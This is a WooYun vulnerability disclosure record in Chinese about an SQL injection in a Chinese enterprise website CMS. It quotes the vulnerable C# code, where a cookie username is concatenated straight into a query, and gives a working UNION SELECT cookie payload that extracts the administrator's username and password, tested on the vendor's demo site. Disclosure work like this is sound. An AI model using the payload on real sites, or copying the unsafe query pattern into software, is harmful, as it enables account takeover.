{"id": 49836, "wybug_id": "wooyun-2014-079879", "wybug_title": "某通用建站系统SQL注入漏洞可获得管理员权限", "wybug_corp": "创都启航", "wybug_author": "路人甲", "wybug_date": "2014-10-21 13:08", "wybug_open_date": "2015-01-19 13:10", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["白盒测试", "源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-21：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-01-19：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 某通用建站系统过滤不严导致SQL注入漏洞可获得管理员权限，影响站点众多。 详细说明：  创都启航 企业网站管理系统 SQL注入漏洞源码下载地址：http://www.95c.com.cn/下面给出官方演示站的证明首先我们来的这么一个网站，注册一个会员账号，这个是官方给的演示网站http://demo.95c.com.cn注册成功以后，登录会员中心 来到会员系统这里这里有个在线留言功能此处在进行查询留言时，结合用户cookie信息进行查询此处过滤不严导致注入代码如下所示\nprivate ICollection CreateSource()        {            string strQuery = \"select * ,iif(IsNull(Reply)=True,'否','是') as Reply1 from QH_MessageMember where Name='\" + ((string) this.ViewState[\"UserName\"]) + \"' order by id desc\"; //此处使用UserName，注入点            DataTable table = this.Bll1.GetDataTablePage(this.CurrentPage * this.PageSize, this.PageSize, strQuery);            if (table == null)            {                return null;            }            if (table.Rows.Count == 0)            {                return null;            }            table.Columns.Add(\"AddDate1\");            foreach (DataRow row in table.Rows)            {                if (row[\"AddDate\"].ToString() != string.Empty)                {                    row[\"AddDate1\"] = ((DateTime) row[\"AddDate\"]).ToString(\"yyyy-MM-dd HH:mm:ss\");                }            }            return table.DefaultView;        }\n跟踪UserName的来源可以看到如下代码\npublic static string GetAndTestUserName()        {            string str = \"\";            HttpContext.Current.Response.CacheControl = \"no-cache\";            if (HttpContext.Current.Request.Cookies[\"CmsUserName\"] != null)            {                //从cookie当中获得CmsUserName的值                str = HttpUtility.UrlDecode(HttpContext.Current.Request.Cookies[\"CmsUserName\"].Value);            }            if (string.IsNullOrEmpty(str))            {                HttpContext.Current.Response.Write(\"<script>alert('请先登陆！');location='Landing.aspx';</script>\");            }            return str;        }\n获得用户名信息未进行过滤 直接传入到查询当中因此我们便可以构造语句获得相应的信息构造cookie信息如下所示名称：CmsUserName内容：' union  select 1,'2',3,admin,'5',6,null,null from admin where '1'='1构造好了以后 刷新页面 标题内显示管理员账号，截图如下\n\n更换字段名 将admin 换成pwd获得密码字段的值 如下所示\n\n获得如下信息 管理员账号\n\nmask 区域\n*****in 密^*****\n\n\n\nmask 区域\n1.://**.**.**//demo.95c.com.cn/CDQHCmsBack/admin_login.aspx_*****^^录^*****\n\n用户量还是蛮大的。\n\n   漏洞证明：  证明如上。   修复方案：  对用到cookie的地方进行过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}